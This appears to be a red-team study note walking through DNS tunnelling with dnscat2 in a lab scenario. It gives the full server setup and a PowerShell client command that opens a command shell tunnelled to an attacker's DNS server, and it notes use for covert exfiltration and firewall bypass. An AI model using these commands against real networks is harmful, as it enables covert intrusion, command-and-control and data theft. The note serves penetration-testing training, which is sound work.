# DNS Tunnelling with Dnscat2

## Overview

**Dnscat2** is a Command & Control (C2) tunnelling tool that uses the **DNS protocol** to transmit data between systems.

Instead of communicating over typical protocols such as:

- HTTP
- HTTPS
- TCP reverse shells

Dnscat2 encapsulates data inside **DNS queries and responses**, typically using **TXT records**.

This allows attackers to:

- bypass strict firewall rules
- evade HTTPS inspection proxies
- exfiltrate data covertly
- maintain persistent C2 channels
- communicate through heavily restricted networks

Because DNS traffic is almost always allowed outbound in corporate environments, DNS tunnelling can be an extremely stealthy pivoting and exfiltration method.

---

# Why DNS Tunnelling Works

Most corporate environments allow DNS traffic because:

- internal hosts must resolve domain names
- blocking DNS breaks normal business operations
- DNS traffic is rarely inspected deeply
- DNS often allowed outbound on UDP/TCP 53

Dnscat2 abuses this trust by embedding data inside DNS requests.

---

# High-Level Workflow

```
compromised host
        ↓
DNS request with encoded data
        ↓
corporate DNS server
        ↓
authoritative DNS server (attacker)
        ↓
dnscat2 server processes data
        ↓
encrypted C2 communication channel
```

Data is hidden inside:

```
TXT records
subdomain queries
DNS response payloads
```

---

# Architecture

Dnscat2 consists of two components:

| Component | Location | Purpose |
|----------|----------|---------|
| dnscat2 server | attack host | receives DNS tunnel traffic |
| dnscat2 client | compromised host | sends encoded DNS queries |

---

# Scenario

Attack host:

```
10.10.14.18
```

Target environment:

- internal DNS server resolves queries
- outbound DNS allowed
- HTTP/HTTPS heavily filtered
- need covert C2 channel

Solution:

DNS tunnelling using dnscat2.

---

# Install Dnscat2 Server

Clone repository:

```bash
git clone https://github.com/iagox86/dnscat2.git
```

Move into server directory:

```bash
cd dnscat2/server/
```

Install dependencies:

```bash
sudo gem install bundler
sudo bundle install
```

---

# Start Dnscat2 Server

```bash
sudo ruby dnscat2.rb \
--dns host=10.10.14.18,port=53,domain=inlanefreight.local \
--no-cache
```

---

# Parameter Breakdown

| Parameter | Description |
|----------|-------------|
| --dns | enables DNS mode |
| host=10.10.14.18 | attack host IP |
| port=53 | DNS listening port |
| domain=inlanefreight.local | domain used for tunnelling |
| --no-cache | disables DNS caching |

---

# Example Server Output

```text
Starting Dnscat2 DNS server on 10.10.14.18:53
[domains = inlanefreight.local]

Security policy changed:
All connections must be encrypted

Secret key:
0ec04a91cd1e963f8c03ca499d589d21
```

Important:

The **PreSharedSecret** is required by the client.

This ensures:

- encrypted communication
- authenticated tunnel
- protection against session hijacking

---

# Install dnscat2 PowerShell Client

Clone dnscat2 PowerShell client:

```bash
git clone https://github.com/lukebaggett/dnscat2-powershell.git
```

Transfer to compromised Windows host.

---

# Import PowerShell Module

On Windows target:

```powershell
Import-Module .\dnscat2.ps1
```

---

# Establish DNS Tunnel

```powershell
Start-Dnscat2 \
-DNSserver 10.10.14.18 \
-Domain inlanefreight.local \
-PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 \
-Exec cmd
```

---

# Parameter Breakdown

| Parameter | Description |
|----------|-------------|
| -DNSserver | attacker DNS server |
| -Domain | domain used for tunnel |
| -PreSharedSecret | encryption key |
| -Exec cmd | launch command shell |

---

# Connection Establishment

Expected server output:

```text
New window created: 1

Session 1 Security:
ENCRYPTED AND VERIFIED
```

Indicates:

- encrypted tunnel established
- client successfully authenticated
- C2 channel operational

---

# Interaction with Session

List sessions:

```text
dnscat2> windows
```

Interact with session:

```text
dnscat2> window -i 1
```

Example shell:

```text
Microsoft Windows [Version 10.0.18363.1801]

C:\Windows\system32>
```

---

# Useful Dnscat2 Commands

Display help:

```text
dnscat2> ?
```

Common commands:

| Command | Purpose |
|--------|---------|
| windows | list sessions |
| window -i <id> | interact with session |
| start | start tunnel |
| stop | stop tunnel |
| tunnels | list tunnels |
| set | configure options |
| kill | terminate session |
| quit | exit dnscat2 |

---

# Data Flow Visualization

```
Windows target
     ↓
DNS query with encoded data
     ↓
corporate DNS server
     ↓
attacker authoritative DNS
     ↓
dnscat2 server
     ↓
interactive shell
```

---

# Example DNS Traffic Pattern

Normal DNS query:

```
www.google.com
```

Dnscat2 query:

```
dGhpcyBpcyBlbmNvZGVkLmRhdGE.inlanefreight.local
```

Encoded payload hidden inside DNS label.

---

# Why DNS Tunnelling is Stealthy

DNS often bypasses:

- web proxies
- SSL inspection
- IDS filtering tuned for HTTP traffic
- firewall restrictions on outbound connections

Because DNS is critical infrastructure, it is rarely blocked.

---

# Use Cases

## Data Exfiltration

Transfer sensitive files covertly.

## Command & Control

Maintain persistent communication channel.

## Firewall Bypass

Operate in heavily restricted environments.

## Network Pivoting

Access segmented internal resources.

## Red Team Persistence

Maintain stealthy communication.

---

# Limitations

## Slow throughput

DNS not designed for large data transfers.

## Detection possible

Advanced monitoring can detect:

- high DNS query volume
- unusual TXT record activity
- entropy anomalies

## Requires domain configuration

Authoritative DNS server often required.

## May trigger alerts

SOC teams monitor DNS anomalies.

---

# Comparison with Other Pivot Methods

| Method | Protocol | Stealth level |
|-------|----------|--------------|
| SSH tunnelling | TCP | medium |
| SOCKS proxy | TCP | medium |
| HTTPS beacon | HTTPS | medium |
| DNS tunnelling | DNS | high |
| ICMP tunnelling | ICMP | high |

---

# Quick Command Reference

## Clone dnscat2

```bash
git clone https://github.com/iagox86/dnscat2.git
```

## Install dependencies

```bash
cd dnscat2/server
sudo gem install bundler
sudo bundle install
```

## Start server

```bash
sudo ruby dnscat2.rb \
--dns host=10.10.14.18,port=53,domain=inlanefreight.local \
--no-cache
```

## Import PowerShell client

```powershell
Import-Module .\dnscat2.ps1
```

## Connect client

```powershell
Start-Dnscat2 \
-DNSserver 10.10.14.18 \
-Domain inlanefreight.local \
-PreSharedSecret <secret> \
-Exec cmd
```

## Interact with session

```text
dnscat2> window -i 1
```

---

# Mental Model

Dnscat2 hides command-and-control traffic inside DNS queries.

Instead of:

```
victim --> HTTPS C2 server
```

traffic becomes:

```
victim --> DNS query --> attacker DNS server
```

making communication blend with normal network activity.

---

# Key Takeaways

- dnscat2 tunnels data through DNS queries.
- communication occurs via TXT records.
- traffic encrypted using pre-shared secret.
- useful for stealthy C2 channels.
- bypasses many firewall restrictions.
- effective in highly restricted environments.

---

# Tags

#pivoting  
#tunnelling  
#dns  
#dnscat2  
#c2  
#data-exfiltration  
#redteam  
#networking  
#windows  
#obsidian